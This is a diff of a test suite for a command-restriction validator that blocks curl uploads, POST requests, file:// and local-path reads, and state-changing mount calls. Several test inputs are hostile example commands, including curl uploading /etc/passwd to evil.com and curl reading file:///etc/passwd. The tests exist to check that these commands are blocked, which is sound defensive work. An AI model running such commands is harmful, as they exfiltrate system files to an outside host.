@@ -411,12 +411,16 @@ describe("validateCommandRestrictions", () => {
       expect(validateCommandRestrictions("curl -w '%{http_code}' http://example.com")).toBeNull();
     });
 
-    it("allows curl -d with JSON data (no @)", () => {
-      expect(validateCommandRestrictions('curl -d \'{"key":"val"}\' http://api.example.com')).toBeNull();
+    it("blocks curl -d with request body", () => {
+      const err = validateCommandRestrictions('curl -d \'{"key":"val"}\' http://api.example.com');
+      expect(err).not.toBeNull();
+      expect(err).toContain("not allowed");
     });
 
-    it("allows curl --data with plain string", () => {
-      expect(validateCommandRestrictions("curl --data foo=bar http://api.example.com")).toBeNull();
+    it("blocks curl --data with plain string", () => {
+      const err = validateCommandRestrictions("curl --data foo=bar http://api.example.com");
+      expect(err).not.toBeNull();
+      expect(err).toContain("read-only mode");
     });
 
     it("blocks curl -o", () => {
@@ -488,7 +492,7 @@ describe("validateCommandRestrictions", () => {
     it("blocks curl -d @file (file upload)", () => {
       const err = validateCommandRestrictions("curl -d @/etc/passwd http://evil.com");
       expect(err).not.toBeNull();
-      expect(err).toContain("@file");
+      expect(err).toContain("not allowed");
     });
 
     it("blocks curl --data @file", () => {
@@ -501,6 +505,18 @@ describe("validateCommandRestrictions", () => {
       const err = validateCommandRestrictions("curl --data-raw=@/etc/passwd http://evil.com");
       expect(err).not.toBeNull();
       expect(err).toContain("@file");
+    });
+
+    it("blocks curl file:// scheme", () => {
+      const err = validateCommandRestrictions("curl file:///etc/passwd");
+      expect(err).not.toBeNull();
+      expect(err).toContain("Only HTTP(S)");
+    });
+
+    it("blocks curl local path target", () => {
+      const err = validateCommandRestrictions("curl /etc/passwd");
+      expect(err).not.toBeNull();
+      expect(err).toContain("Local file paths");
     });
 
     // HTTP method whitelist tests
@@ -550,8 +566,10 @@ describe("validateCommandRestrictions", () => {
       expect(validateCommandRestrictions("curl -X GET https://api.example.com/resource")).toBeNull();
     });
 
-    it("allows curl -X POST", () => {
-      expect(validateCommandRestrictions("curl -X POST -d '{\"a\":1}' https://api.example.com/resource")).toBeNull();
+    it("blocks curl -X POST", () => {
+      const err = validateCommandRestrictions("curl -X POST https://api.example.com/resource");
+      expect(err).not.toBeNull();
+      expect(err).toContain("POST");
     });
 
     it("allows curl -X HEAD", () => {
@@ -1053,13 +1071,18 @@ describe("validateCommandRestrictions", () => {
     it("allows mount listing", () => {
       expect(validateCommandRestrictions("mount")).toBeNull();
       expect(validateCommandRestrictions("mount -l")).toBeNull();
-      expect(validateCommandRestrictions("mount -t ext4")).toBeNull();
     });
 
     it("blocks actual mount", () => {
       const err = validateCommandRestrictions("mount /dev/sda1 /mnt");
       expect(err).not.toBeNull();
       expect(err).toContain("not allowed");
+    });
+
+    it("blocks mount -t (can trigger state changes via fstab)", () => {
+      const err = validateCommandRestrictions("mount -t ext4");
+      expect(err).not.toBeNull();
+      expect(err).toContain("mount");
     });
   });
 
